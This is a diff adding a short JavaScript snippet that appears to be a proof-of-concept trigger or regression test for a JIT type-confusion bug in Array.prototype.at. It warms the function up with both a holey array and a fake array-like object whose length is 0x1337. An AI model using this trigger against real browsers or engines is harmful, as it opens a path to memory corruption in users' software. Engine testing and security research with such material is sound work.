@@ -1,0 +1,12 @@
+    function bug(a, i) {
+      return a.at(i);
+    }
+
+    let not_array = { length: 0x1337, 
+    __proto__: Array.prototype, 
+    1: 42 }; 
+    let array = ["pwn",,"pwn",,"pwn"];                                     
+    for (let a = 0; a < 10000; a++) {
+      bug(array, 0);
+      bug(not_array, 0);
+    }
